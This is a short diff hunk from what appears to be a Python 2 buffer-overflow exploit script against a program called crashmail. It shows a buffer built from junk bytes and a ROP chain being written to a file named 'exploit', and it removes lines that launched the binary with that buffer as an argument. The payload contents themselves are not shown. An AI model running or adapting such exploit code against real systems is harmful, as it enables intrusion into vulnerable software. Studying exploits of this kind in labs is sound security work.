@@ -55,13 +55,3 @@ evil_buffer = junk + rop
 
 with open('exploit', 'wb') as f:
     f.write(evil_buffer)
-exit()
-
-try:
-    subprocess.call(["./bin/crashmail","SETTINGS", str(evil_buffer)])
-except OSError as e:
-    if e.errno == os.errno.ENOENT:
-        print "[!] Crashmail not found"
-    else:
-        print "[*] Error executing exploit"
-    raise
